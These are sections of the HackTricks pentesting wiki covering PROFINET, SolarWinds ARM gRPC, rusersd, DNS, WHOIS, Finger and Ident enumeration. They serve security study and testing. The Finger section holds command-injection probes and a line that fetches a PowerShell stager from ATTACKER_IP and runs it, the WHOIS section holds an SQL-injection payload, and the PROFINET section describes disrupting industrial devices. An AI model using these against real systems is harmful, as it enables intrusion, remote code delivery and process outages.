title: HT: PROFINET - Pentesting PROFINET IO (DCP / RT / CM-RPC) (pentesting-profinet)
text: # PROFINET - Pentesting PROFINET IO (DCP / RT / CM-RPC) {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (pentesting-profinet)
text: ## Basic Information For process-safety prerequisites before active OT testing, see [Industrial Control Systems / OT](../industrial-control-systems/README.md#assessment-priorities). **PROFINET** is the Siemens-led industrial Ethernet standard (IEC 61158 / IEC 61784-2, managed by PROFIBUS & PROFINET International / PNO) for real-time automation. It is not one protocol but a family of sub-protocols on the same cable, and getting the transport right is the single most common mistake when scanning it: **the discovery and real-time parts live at Layer 2 (raw Ethernet, EtherType `0x8892`), not on any TCP/UDP port**, while the acyclic context-manager (CM) RPC rides UDP.<sup>[[4]](#references)[[6]](#references)</sup> | Sub-protocol | What it does | Transport | |---|---|---| | **PROFINET DCP** (Discovery and Configuration Protocol) | Device discovery, station-name and IP assignment, factory reset, LED flash | **Layer 2**, EtherType `0x8892` (no IP) | | **PROFINET RT** (Real-Time, cyclic IO) | Cyclic process I/O exchange controller<->device | **Layer 2**, EtherType `0x8892` (FrameID `0x8000-0xBFFF`) | | **PROFINET IRT / PTCP** | Isochronous real-time + clock sync | Layer 2 (PTCP EtherType `0x88F7`) | | **PROFINET CM / acyclic RPC** (PNIO-CM) | Connect/Release/Read/Write/Control: parameterization, I&M, diagnostics, records | **DCE/RPC over UDP 34964** (CM); RT endpoints 34962/34963 | | **S7comm / S7comm-plus** (engineering) | Program/read/write the PLC CPU behind the PROFINET interface | TCP **102** (ISO-TSAP/COTP) | IANA registers the UDP/TCP range for the RPC side explicitly:<sup>[[1]](#references)</sup> ```text 34962/tcp,udp profinet-rt PROFINET RT Unicast 34963/tcp,udp profinet-rtm PROFINET RT Multicast 34964/tcp,udp profinet-cm PROFINET Context Manager <- acyclic Read/Write/C

title: HT: Enumeration (pentesting-profinet)
text: ## Enumeration ### Automatic nmap covers both the Layer-2 discovery surface and the routable RPC surface: ```bash nmap -sV --script=multicast-profinet-discovery # L2: broadcast DCP Identify-All, list every device nmap -sU -p 34964 --script profinet-cm-lookup <IP> # CM-RPC DCE/RPC EPM lookup -> product name + firmware nmap -p 102 --script s7-info <IP> # Siemens S7 CPU identity (102 shared w/ S7comm) nmap -sU -p 34962,34963,34964 <IP> # is the CM/RT RPC surface routable from here? ``` `multicast-profinet-discovery` is a `safe`/`broadcast` prerule script: it sends a multicast **DCP Identify-All** and prints every responding device (MAC, station name, vendor/device ID). Because DCP is Layer 2, run it from a host on the PROFINET segment; it is the one scripted path for the L2 inventory that OIDA/scapy otherwise cover below.<sup>[[10]](#references)</sup> `profinet-cm-lookup` sends a **DCE/RPC Endpoint-Mapper Lookup** for the PNIO interface UUID `dea00001-6c97-11d1-8271-00a02442df7d` to **UDP/34964**; a reply (e.g. `S7-1500 6ES7 672-5DC01-0YA0`) confirms an exposed, unauthenticated CM endpoint. It is categorized **discovery/intrusive**, so run it only under authorization.<sup>[[2]](#references)</sup> `s7-info` targets **TCP/102** for CPU/firmware/protection details on Siemens controllers.<sup>[[3]](#references)</sup> ### Passive Recon PROFINET is plaintext, so a capture off a SPAN/tap usually hands you the device inventory, station names, the slot/subslot map, and any write/control activity before you emit a single frame. Useful Wireshark display filters (`pn_dcp` is documented on the Wireshark PROFINET/DCP page; `pn_rt`/`pn_io` are the RT and acyclic-RPC dissectors):<sup>[[5]](#references)[[6]](#references)</sup> ```bash pn_dcp # all DCP (discovery / name+IP config) pn_dcp.se

title: HT: What Usually Leads to Impact (pentesting-profinet)
text: ## What Usually Leads to Impact In real assessments the path to impact is not a memory-corruption exploit; it is that PROFINET trusts whoever reaches the wire: - **L2 bleed-through.** PROFINET on a VLAN shared with IT lets an IT-side host inject `0x8892` frames straight at the devices, bypassing the IT/OT firewall (which never sees an L2 frame). Confirm it by capturing `eth.type == 0x8892` from the corp segment, or by getting DCP Identify responses from across the boundary. Maps to **Remote System Discovery (T0846)**, incl. its multicast-discovery sub-technique.<sup>[[7]](#references)</sup> - **Unauthenticated inventory + firmware disclosure.** One DCP Identify-All yields every device, name, IP, and vendor/device ID; CM-RPC Read of I&M0 adds exact firmware/serial - with no credential. - **Unauthenticated parameter writes.** CM-RPC Write to device records (and the writable I&M indices) with no auth lets an attacker alter device parameters; on many field devices this reaches process-affecting settings. Maps to **Modify Parameter (T0836)**.<sup>[[9]](#references)</sup> - **DCP Set as a denial-of-service.** Set-Name, Set-IP, or factory-reset reconfigures a device out from under its controller, dropping the AR and faulting or halting the process - a reliable, low-effort outage primitive. Maps to **Denial of Service (T0814)**.<sup>[[8]](#references)</sup> - **No integrity or replay protection** on DCP/RT/CM in Class 0/1: captured frames can be replayed and RT/PTCP streams spoofed where PROFINET Security (Class 3) is not deployed. Practical workflow: 1. Get **L2 access** to the cell (tap/SPAN/NIC on the plant VLAN) or find a routable **UDP/34964** path. 2. **Passively** capture first (`oida pcap ... --protocols profinet`) to inventory controllers, devices, and station names wi

title: HT: 55555 - Pentesting SolarWinds Access Rights Manager gRPC (55555-pentesting-solarwinds-arm)
text: # 55555 - Pentesting SolarWinds Access Rights Manager gRPC {{#include ../banners/hacktricks-training.md}}

title: HT: Basic information (55555-pentesting-solarwinds-arm)
text: ## Basic information SolarWinds Access Rights Manager (ARM) uses a TLS gRPC listener on TCP `55555` for communication between ARM components. The listener speaks HTTP/2 and requires ALPN `h2`; a generic TLS probe that omits ALPN may receive a reset and incorrectly report the service as dead. ARM transports legacy .NET Remoting messages through this channel and deserializes their content with `BinaryFormatter`. The ARM service runs as `LocalSystem` by default, so code execution in this process starts as `NT AUTHORITY\SYSTEM` and may also expose credentials and delegated access held by ARM.<sup>[[2]](#references)[[3]](#references)</sup> For generic gadget-chain details, see [Basic .NET Deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md). For follow-up impact assessment, see [Windows Local Privilege Escalation](../windows-hardening/windows-local-privilege-escalation/) and the [Active Directory Methodology](../windows-hardening/active-directory-methodology/).

title: HT: Authentication boundary and deserialization chain (55555-pentesting-solarwinds-arm)
text: ## Authentication boundary and deserialization chain CVE-2026-28326 is a useful example of how a local compatibility mechanism can become a remote authentication bypass. ARM asks for a TLS client certificate but permits the handshake to complete without one. A vulnerable build then accepts a fallback HMAC in a request header. The shared key ships with the product and the MAC covers only caller-controlled values. It has no nonce, server challenge, channel binding, or binding to the serialized body, so possession of the key permits offline token generation.<sup>[[1]](#references)[[2]](#references)</sup> The complete trust-boundary failure is:<sup>[[2]](#references)</sup> 1. TCP `55555` is reachable and the listener accepts TLS without a client certificate. 2. The fallback token was intended for local child processes, but the server does not validate loopback origin or process identity. 3. After accepting the token, the server loads a registered-client certificate from its own store and adopts its thumbprint. Downstream code therefore authorizes the remote caller as that client. A matching certificate is present on a default installation. 4. The caller reaches `/SolarWinds_ARM_Remoting.Remoting/Send`, where .NET Remoting data is passed to `BinaryFormatter`. 5. A regex denylist of known gadget types does not constrain the full .NET type space. A surviving gadget chain executes with the ARM service identity. This chain shows why mTLS must be required rather than merely requested. It also shows why a server must not convert a weak fallback credential into a stronger identity by borrowing a certificate from its own trust store.<sup>[[2]](#references)</sup>

title: HT: Safe behavioral patch-state check (55555-pentesting-solarwinds-arm)
text: ## Safe behavioral patch-state check [BishopFox/CVE-2026-28326-check](https://github.com/BishopFox/CVE-2026-28326-check) distinguishes the vulnerable and patched authentication interceptors without using the shared key or sending a serialized object. Run it against the **ARM server**, not only a collector. Both probes send a valid five-byte gRPC message envelope containing an empty protobuf body and open separate TLS connections.<sup>[[2]](#references)[[3]](#references)</sup> ```bash git clone https://github.com/BishopFox/CVE-2026-28326-check cd CVE-2026-28326-check python3 cve_2026_28326_check.py arm.example.com python3 cve_2026_28326_check.py arm.example.com:55555 python3 cve_2026_28326_check.py -f targets.txt --brief python3 cve_2026_28326_check.py -f targets.txt --json > results.json ``` The detector calls these exact paths. The misspelling in `ConnectionAuthrization` is part of the service name:<sup>[[3]](#references)</sup> ```text /SolarWinds_ARM_GRPC_ConnectionAuthrization.ConnectionAuthorization/GetCertificate /SolarWinds_ARM_Remoting.Remoting/Send ``` Interpret the pair of returned `grpc-status` values as follows:<sup>[[2]](#references)[[3]](#references)</sup> | `Remoting/Send` | `GetCertificate` | Result | | --- | --- | --- | | `14 UNAVAILABLE` | `0 OK` | **VULNERABLE** server-role path, normally build `2026.2.0.42` or earlier | | `16 UNAUTHENTICATED` | Any status | **PATCHED** gate, build `2026.2.1.7` or later | | `14 UNAVAILABLE` | `14 UNAVAILABLE` | **INCONCLUSIVE**: collector or server refusing external requests | The second request identifies a server role because collectors reject both methods in the same way. The verdict comes from the duplex-streaming `Remoting/Send` handler because it preserves the interceptor status. The tool negotiates ALPN `h2` and

title: HT: Exposure and forensic checks (55555-pentesting-solarwinds-arm)
text: ## Exposure and forensic checks Inspect the actual Windows Firewall rule rather than relying on the installation default. ARM can bind every interface, including IPv6. Multi-host deployments need TCP `55555` between ARM components, and a broad internal allow rule turns an adjacent-only issue into a network-reachable service. Restrict the port to the collectors and clients that require it.<sup>[[2]](#references)</sup> Rejected anonymous requests can produce `Unable to validate remote request token` in ARM debug logs. A successfully forged token can be quieter because authentication returns early. Where the `GrantMA` service is deployed, an ARM administrator can query `GET /api/armconfig/network/Connections`. A `NetworkConnectionEntry` with `IsAuthenticated: false` and a populated `ClientCertThumbPrint` is consistent with the bypass and is not produced by normal client authentication. This list is memory-only, entries expire after three days, and the service restart performed during patching clears it. Collect this evidence before upgrading, and do not treat an empty result as proof that exploitation did not occur.<sup>[[2]](#references)[[3]](#references)</sup> Upgrade to ARM `2026.2.1.7` or later. The fix removes the shared-key fallback. It permits certificate-less local child processes only from localhost with a fresh GUID generated at every server start and passed to those processes as a token. It also changes the anonymous rejection to `16 UNAUTHENTICATED` with `Client certificate not found. Please register your application first.`<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: 1026 - Pentesting Rusersd (1026-pentesting-rusersd)
text: # 1026 - Pentesting Rusersd {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (1026-pentesting-rusersd)
text: ## Basic Information `rusersd` is a legacy SunRPC/ONC RPC service that answers `rusers` queries and returns `who`-style information about users currently logged in to the target. In long format this can reveal the username, hostname, TTY, login time, idle time, and sometimes the remote host the session came from, which is enough to identify real usernames, active sessions, and interesting pivot hosts.<sup>[[1]](#references)</sup> Although this page is named after **port 1026**, `rusersd` is usually **not** a fixed `1026/tcp` or `1026/udp` service. In practice it is normally discovered through **rpcbind/portmapper** as RPC program **`100002`**, often exposing versions **2** and **3** over UDP and sometimes TCP on dynamically assigned high ports.<sup>[[2]](#references)</sup> If you haven't mapped the RPC programs yet, start with [Pentesting Portmapper / RPCBind](pentesting-rpcbind.md). ![1026 - Pentesting Rusersd: This protocol will provide you the usernames of the host. You may be able to find this services listed by the port-mapper service like this](<../images/image (1041).png>)

title: HT: Enumeration (1026-pentesting-rusersd)
text: ## Enumeration ### Discover it behind rpcbind ```bash rpcinfo -p <target> | grep -i rusersd

title: HT: or (1026-pentesting-rusersd)
text: # or nmap -sV -p 111 --script rpcinfo <target> ``` The interesting part of the output is the RPC program number, supported versions, transport, and the real high port assigned by `rpcbind`.<sup>[[2]](#references)</sup> ```bash 100002 2,3 32776/udp rusersd 100002 2,3 32780/tcp rusersd ``` ### Query a single host ```bash apt-get install rusers rusers -l <target> rusers -al <target> ``` `-l` requests the long listing, which is the most useful mode during a pentest because it exposes the TTY, login timestamp, idle time, and remote origin host when available. `-a` is useful when you want to confirm that the daemon responds even if nobody is currently logged in.<sup>[[1]](#references)</sup> Example: ```bash root@kali:~# rusers -l 192.168.10.1 Sending broadcast for rusersd protocol version 3... Sending broadcast for rusersd protocol version 2... tiff potatohead:console Sep 2 13:03 22:03 katykat potatohead:ttyp5 Sep 1 09:35 14 ``` ### Broadcast the local segment If no host is specified, `rusers` queries the local network and waits briefly for late responses, which makes it useful for quickly identifying legacy UNIX hosts on the same broadcast domain.<sup>[[1]](#references)</sup> ```bash rusers -a rusers -al rusers -h rusers -il ``` Useful flags:<sup>[[1]](#references)</sup> - `-a`: Print hosts that answer even when no one is logged in. - `-h`: Sort results by hostname. - `-i`: Sort by idle time to quickly spot active sessions. - `-l`: Print the long `who`-style listing. ### Offensive use of the output Treat `rusersd` as a **username and session-intelligence leak**, not just as a banner grab. Low-idle sessions often point to real operators or admins currently working on the system, while the optional remote-host field can reveal jump boxes, trusted workstations, or naming conven

title: HT: 53 - Pentesting DNS (pentesting-dns)
text: # 53 - Pentesting DNS {{#include ../banners/hacktricks-training.md}}

title: HT: Basic information (pentesting-dns)
text: ## Basic information The **Domain Name System (DNS)** serves as the internet's directory, allowing users to access websites through **easy-to-remember domain names** like google.com or facebook.com, instead of the numeric Internet Protocol (IP) addresses. By translating domain names into IP addresses, the DNS ensures web browsers can quickly load internet resources, simplifying how we navigate the online world. **Default port:** 53 ``` PORT STATE SERVICE REASON 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) 5353/udp open zeroconf udp-response 53/udp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) ``` ### Different DNS servers - **DNS root servers**: These servers are at the top of the public DNS hierarchy and return referrals for top-level domains. There are 13 named root-server identifiers (`A` through `M`), each implemented by many anycast instances; this does not mean that only 13 physical servers exist.<sup>[[2]](#references)</sup> - **Authoritative nameservers**: These servers provide authoritative answers for their configured zones, including answers, referrals for delegated child zones, or negative responses. A recursive resolver—not the authoritative server—walks the hierarchy when further lookup is required. - **Non-authoritative Nameservers**: Lacking ownership over DNS zones, these servers gather domain information through queries to other servers. - **Caching DNS Server**: This type of server memorizes previous query answers for a set time to speed up response times for future requests, with the cache duration dictated by the authoritative server. - **Forwarding Server**: Serving a straightforward role, forwarding servers simply relay queries to another server. - **Resolver**: Integrated within co

text: ## Enumeration ### **Banner Grabbing** DNS has no conventional service banner, but some BIND servers answer the `version.bind. CHAOS TXT` query. Administrators can disable or replace this value, so an empty or customized response is not conclusive.\ You can perform this query using `dig`: ```bash dig version.bind CHAOS TXT @DNS ``` Moreover, the tool [`fpdns`](https://github.com/kirei/fpdns) can also fingerprint the server. It's also possible to grab the banner also with a **nmap** script: ``` --script dns-nsid ``` ### **Any record** An **`ANY`** query asks the DNS server to return whatever record set it is willing and able to provide; modern authoritative servers may intentionally return a minimal response rather than every record.<sup>[[4]](#references)</sup> ```bash dig any victim.com @<DNS_IP> ``` ### **Zone Transfer** `AXFR` is the DNS mechanism for transferring a complete zone from an authoritative server.<sup>[[3]](#references)</sup> ```bash dig axfr @<DNS_IP> #Try zone transfer without domain dig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain fierce --domain <DOMAIN> --dns-servers <DNS_IP> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack ``` ### More info ```bash dig ANY @<DNS_IP> <DOMAIN> #Any information dig A @<DNS_IP> <DOMAIN> #Regular DNS request dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS request dig TXT @<DNS_IP> <DOMAIN> #Information dig MX @<DNS_IP> <DOMAIN> #Emails related dig NS @<DNS_IP> <DOMAIN> #DNS that resolves that name dig -x 192.168.0.2 @<DNS_IP> #Reverse lookup dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup #Use [-p PORT] or -6 (to use ivp6 address of dns) ``` #### Automation ```bash for sub in $(cat <WORDLIST>);do dig $sub.<DOMAIN> @<D

title: HT: Post-Exploitation (pentesting-dns)
text: ## Post-Exploitation - When reviewing a BIND server, inspect **`allow-transfer`** to determine who can request zone transfers, and **`allow-recursion`** and **`allow-query`** to determine who can send recursive and general queries. - The following are the names of DNS related files that could be interesting to search inside machines: ``` host.conf /etc/resolv.conf /etc/bind/named.conf /etc/bind/named.conf.local /etc/bind/named.conf.options /etc/bind/named.conf.log /etc/bind/* ```

title: HT: 43 - Pentesting WHOIS (43-pentesting-whois)
text: # 43 - Pentesting WHOIS {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (43-pentesting-whois)
text: ## Basic Information The **WHOIS** protocol provides text-based queries for information about Internet resources, including domain names, IP address blocks, and autonomous systems. The data model and query syntax are service-specific; RFC 3912 standardizes only the simple transport exchange.<sup>[[3]](#references)</sup> **Default port:** 43 ```text PORT STATE SERVICE 43/tcp open whois? ``` From an offensive point of view, remember that **WHOIS is a plain-text TCP service**: the client sends a query terminated by CRLF, the server returns text, and the **connection close marks the end of the response**. The protocol has no built-in authentication, integrity, or confidentiality.<sup>[[3]](#references)</sup> ### Modern Reality: WHOIS vs RDAP For Internet domain registration data, **WHOIS is no longer the authoritative option for many public gTLD workflows**. ICANN sunset WHOIS for gTLD registration data on **2025-01-28**, making **RDAP** the protocol to prefer for machine-readable domain registration lookups.<sup>[[1]](#references)</sup> However, TCP/`43` is still worth testing because it keeps appearing in: - **Legacy or private WHOIS services** - **RIR / IP allocation workflows** - **Internal registries and custom asset databases** - **Third-party web tools and old automation** that still trust WHOIS responses If your goal is **reverse whois**, broader asset expansion, or recursive external recon, check [the External Recon Methodology page](../generic-methodologies-and-resources/external-recon-methodology/README.md) to avoid duplicating work here.

title: HT: Enumerate (43-pentesting-whois)
text: ## Enumerate Get all the information that a whois service has about a domain: ```bash whois -h <HOST> -p <PORT> "domain.tld" printf 'domain.tld\r\n' | nc -vn <HOST> <PORT> ``` If you find a public-facing WHOIS service, test both **domain** and **IP/ASN** style queries because many implementations expose different backends or parsers depending on the object type: ```bash

text: # Domain printf 'example.com\r\n' | nc -vn <HOST> 43

text: # IP / CIDR / ASN examples printf '8.8.8.8\r\n' | nc -vn <HOST> 43 printf 'AS15169\r\n' | nc -vn <HOST> 43 ``` Sometimes a WHOIS response identifies the database or upstream registry being queried: ![Domain - IP / CIDR / ASN examples: Notice than sometimes when requesting for some information to a WHOIS service the database being used appears in the response](<../images/image (301).png>) ### Referral Chasing and Better Enumeration Useful WHOIS enumeration is often hidden behind **referrals**. One server may only identify the next authoritative service for a TLD or RIR. Test referral handling manually because custom clients and gateways can redact fields inconsistently or expose backend metadata.<sup>[[4]](#references)</sup> Useful options and helpers: ```bash

text: # Ask IANA first and then follow the authoritative referral (common Linux whois clients) whois -I example.com whois -I 8.8.8.8

title: HT: For IP ranges, disable the WHOIS cache if you care about smaller delegated blocks (43-pentesting-whois)
text: # For IP ranges, disable the WHOIS cache if you care about smaller delegated blocks nmap --script whois-ip --script-args whois.whodb=nocache <target> ``` Interesting fields to pivot on when the service is not fully redacted: - **Registrar / Org / abuse contact** for phishing reporting or org-mapping - **Creation / update / expiration times** to spot newly registered infrastructure - **Nameservers** to cluster domains managed by the same operator - **Referral server names** to find legacy or forgotten WHOIS infrastructure ### RDAP as the Structured Successor Even if the exposed service is classic WHOIS on port `43`, check whether the same provider also offers **RDAP** because RDAP is often easier to parse and better for automation: ```bash curl -s https://www.rdap.net/domain/example.com | jq curl -s https://rdap.arin.net/registry/ip/8.8.8.8 | jq ``` A 2024 measurement study comparing WHOIS and RDAP at scale found that they are **not always interchangeable**, with inconsistencies in fields such as registrar identifiers, creation dates, and nameservers. If a recon pipeline depends on those values, compare both sources before making decisions.<sup>[[5]](#references)</sup>

title: HT: Offensive Notes (43-pentesting-whois)
text: ## Offensive Notes ### Backend Injection in Custom WHOIS Gateways Custom WHOIS gateways commonly query a registry database or proxy another directory. If input is concatenated into a backend query, **SQL injection** or another injection class may be possible. For example, an authorized lab test might send `whois -h 10.10.10.155 -p 43 "a') or 1=1#"`; this is an implementation flaw, not a property of the WHOIS protocol. Do not limit testing to SQLi. In internal or niche WHOIS deployments, the query can be proxied to: - SQL / NoSQL backends - LDAP directories - shell wrappers around other lookup tools - HTTP APIs used by registrar or asset-management portals So fuzz with payloads for **SQLi**, **LDAP injection**, delimiter abuse, very long strings, and malformed UTF-8 / control characters. The protocol itself is simple; the dangerous part is usually the **parser or backend glue code**. ### Rogue / Stale WHOIS Servers A relevant 2024-2025 attack path is abusing **outdated WHOIS trust**. If a registry or tool changes its WHOIS hostname and the old domain expires, an attacker may be able to register the old hostname and operate a **rogue WHOIS server**.<sup>[[2]](#references)</sup> That gives the attacker control over the response body seen by: - old WHOIS clients with hardcoded server mappings - web applications that fetch WHOIS output and render it back to users - automation that still uses WHOIS for domain validation or ownership workflows This matters because a rogue WHOIS response can become an entry point for: - **stored/reflected XSS** in web WHOIS frontends - **parser bugs / command injection / eval bugs** in libraries consuming the text response - **bad automation decisions** when systems trust attacker-controlled WHOIS contact data When you find a private or legacy

title: HT: 79 - Pentesting Finger (pentesting-finger)
text: # 79 - Pentesting Finger {{#include ../banners/hacktricks-training.md}}

title: HT: **Basic Info** (pentesting-finger)
text: ## **Basic Info** The **Finger** program/service is utilized for retrieving details about computer users. Typically, the information provided includes the **user's login name, full name**, and, in some cases, additional details. These extra details could encompass the office location and phone number (if available), the time the user logged in, the period of inactivity, the last instance mail was read by the user, and the contents of the user's plan and project files. From a pentesting perspective, Finger is still interesting because the protocol is extremely small, **human-readable**, and often implemented with **legacy parsing logic**. A daemon may disclose: - **currently logged-in users** - **full names / GECOS data** - **home directories, shells, last login times, and TTYs** - **`.plan` / `.project` contents** - **welcome banners** with hostname, OS flavour/release, and uptime on some `fingerd` builds - **relay behaviour** to query a second host through the first one **Default port:** 79 ```text PORT STATE SERVICE 79/tcp open finger ```

title: HT: **Enumeration** (pentesting-finger)
text:
## **Enumeration** ### **Banner Grabbing/Basic connection** ```bash nc -vn <IP> 79 echo "root" | nc -vn <IP> 79 printf '
' | nc -vn <IP> 79 # Null query: ask for logged-in users printf '/W root
' | nc -vn <IP> 79 # Long format, if the daemon supports it ``` The protocol is **ASCII over TCP/79**, normally terminated with **CRLF**, and the **server closes the TCP connection** after the response.<sup>[[1]](#references)</sup> In practice a null query (`
`) is often enough to retrieve the current user list, which is also what Nmap's default `finger` NSE script does.<sup>[[2]](#references)</sup> ### **User enumeration** ```bash finger @<Victim> #List users finger admin@<Victim> #Get info of user finger user@<Victim> #Get info of user finger -l user@<Victim> #Long format from common UNIX clients ``` Alternatively, use Pentestmonkey's **finger-user-enum** for differential username testing and optional relay support:<sup>[[6]](#references)</sup> ```bash finger-user-enum.pl -U users.txt -t 10.0.0.1 finger-user-enum.pl -u root -t 10.0.0.1 finger-user-enum.pl -U users.txt -T ips.txt finger-user-enum.pl -U users.txt -t 10.0.0.2 -r 10.0.0.1 ``` The important nuance with Finger enumeration is that there is **no strict response format** across daemons. Tools such as `finger-user-enum` work well against Solaris-style services because valid and invalid users produce different text layouts, but you may need to manually compare **positive** and **negative** replies and adapt the regexes if the target daemon is unusual. Useful probes when the daemon is not behaving like stock Solaris/BSD: ```bash

title: HT: Older daemons may accept comma-separated names instead of spaces (pentesting-finger)
text: # Older daemons may accept comma-separated names instead of spaces printf 'root,admin,oracle,mysql\r\n' | nc -vn <IP> 79 ``` A practical workflow is to first capture replies for a **known bad username** and a **likely valid username** (`root`, `daemon`, `bin`, application accounts), then diff the outputs. Metasploit's scanner does exactly this kind of differential parsing: it tries an empty query, `0`, `.`, and a repeated multi-user probe before deciding whether to enumerate one username at a time or in batches. #### **Nmap execute a script for doing using default scripts** ```bash nmap -sV -sC -p79 <IP> nmap --script finger -p79 <IP> ``` Nmap's `finger` NSE script is **safe** and simply sends a **null query** to recover the current user list.<sup>[[2]](#references)</sup> If you want broader username guessing against permissive daemons, consider extending the approach with custom wordlists or using projects such as `fat-finger.nse`, which send multiple likely account names in one request and look for username/GECOS matches. ### Metasploit uses more tricks than Nmap ```bash use auxiliary/scanner/finger/finger_users set RHOSTS <IP> set USERS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt run ``` The Metasploit module is useful when Nmap only gives you the online-user list. It automatically: - sends **empty**, `0`, and `.` queries to trigger different code paths - tests whether the daemon accepts **multiple usernames per request** - falls back to **single-user** requests when batching is not supported - stores discovered usernames as a `finger.users` note for follow-on brute force or SSH enumeration The usernames recovered here are usually most useful as inputs for [SSH](pentesting-ssh.md), mail, VPN, or AD username-spraying workflows. ### Shodan - `por

title: HT: Command execution (pentesting-finger)
text: ## Command execution ```bash finger "|/bin/id@example.com" finger "|/bin/ls -a /@example.com" ``` RFC 1288 permits a daemon to run a program owned or configured by the queried user to generate a response, while warning that the feature is dangerous.<sup>[[1]](#references)</sup> It does **not** standardize `|program` in a network query. The classic payloads above are implementation-specific command-injection probes, so they are relevant only to custom or vulnerable legacy daemons. Test carefully for: - shell metacharacters in username handling - `|program` execution or unsafe plan/project hooks - backend wrappers that pass the username to a shell script or CGI Also remember the **client-side** abuse path on Windows: `finger.exe` is a signed LOLBIN that can retrieve arbitrary text from a remote Finger server on **TCP/79**, then feed that output into follow-on tooling.<sup>[[3]](#references)</sup> In recent intrusions this has been used both for **file ingress/exfiltration** and for **ClickFix-style delivery** where the victim is lured into running `finger <nonce>@<domain>` from the Run dialog to fetch a plaintext batch or PowerShell stager.<sup>[[4]](#references)[[5]](#references)</sup> Practical examples: ```cmd :: Save attacker-controlled text returned by the Finger server cmd /c finger a@ATTACKER_IP > payload.txt :: Execute a PowerShell stager delivered as plain text over Finger finger a@ATTACKER_IP | powershell -nop - ``` That technique is more relevant for post-exploitation than service enumeration, so see [the Linux reverse-shell page](../generic-hacking/reverse-shells/linux.md) for the shell transport idea and keep it in mind when emulating attacker tradecraft.

title: HT: Finger Bounce (pentesting-finger)
text: ## Finger Bounce [Use a system as a finger relay](https://securiteam.com/exploits/2BUQ2RFQ0I/) ```bash finger user@host@victim finger @internal@external ``` This isn't just an implementation quirk: **RFC 1288** defines recursive `@hostname` forwarding (`{Q2}` queries).<sup>[[1]](#references)</sup> If the daemon supports relaying, the **intermediate server** opens the second Finger connection for you and returns the response back over the original socket. That means: - your host may **not** connect directly to the final target - the relay can be used to **enumerate internal users** from an exposed Finger service - `finger-user-enum` supports this natively with `-r <relay>` Example: ```bash

title: HT: Ask 10.0.0.1 to finger root on 10.0.0.2 (pentesting-finger)
text: # Ask 10.0.0.1 to finger root on 10.0.0.2 printf 'root@10.0.0.2\r\n' | nc -vn 10.0.0.1 79

title: HT: Enumerate usernames on 10.0.0.2 through relay 10.0.0.1 (pentesting-finger)
text: # Enumerate usernames on 10.0.0.2 through relay 10.0.0.1 finger-user-enum.pl -U users.txt -t 10.0.0.2 -r 10.0.0.1 ``` If relaying works, use it as an **internal recon primitive** and compare the relayed output with the public daemon's direct output. Different formatting or filtering often reveals whether the relay path is handled by a separate backend or wrapper.

title: HT: 113 - Pentesting Ident (113-pentesting-ident)
text: # 113 - Pentesting Ident {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (113-pentesting-ident)
text: ## Basic Information The **Identification Protocol (Ident)** lets one host ask the other end of an existing TCP connection which local operating-system identity owns that connection. A query contains the server-side and client-side port pair, and the Ident server normally listens on TCP/113.<sup>[[2]](#references)</sup> RFC 1413 explicitly warns that an Ident response is not authentication or authorization: it is unauthenticated information asserted by the queried host and may be forged or intentionally misleading. It can still disclose usernames and service-account relationships during enumeration.<sup>[[2]](#references)</sup> **Default port:** 113 ``` PORT STATE SERVICE 113/tcp open ident ```

title: HT: **Enumeration** (113-pentesting-ident)
text: ## **Enumeration** ### **Manual - Get user/Identify the service** If a machine runs Ident and you have a TCP connection from local source port 43218 to its Samba port 445, query the pair `445, 43218`. A response may identify the remote account owning that connection; do not treat it as trusted proof of identity.<sup>[[2]](#references)</sup> ![Enumeration - Manual - Get user/Identify the service: If a machine is running the service ident and samba (445) and you are connected to samba using the port 43218. You can get which...](<../images/image (843).png>) If you just press Enter when you connect to the service: ![Enumeration - Manual - Get user/Identify the service: If you just press Enter when you connect to the service](<../images/image (159).png>) Other errors: ![Enumeration - Manual - Get user/Identify the service: If you just press Enter when you connect to the service](<../images/image (359).png>) ### Nmap Nmap's `auth-owners` script queries Ident for the owner of each suitable open TCP connection. Results depend on the target's Ident policy and are not available for every service or network path.<sup>[[3]](#references)</sup> ``` PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3p2 Debian 9 (protocol 2.0) |_auth-owners: root | ssh-hostkey: | 1024 88:23:98:0d:9d:8a:20:59:35:b8:14:12:14:d5:d0:44 (DSA) |_ 2048 6b:5d:04:71:76:78:56:96:56:92:a8:02:30:73:ee:fa (RSA) 113/tcp open ident |_auth-owners: identd 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL) |_auth-owners: root 445/tcp open netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL) |_auth-owners: root ``` ### Ident-user-enum [**Ident-user-enum**](https://github.com/pentestmonkey/ident-user-enum) is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the proc

text: # WebRTC TURN Server Relay to Internal Networks {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (3478-pentesting-turn)
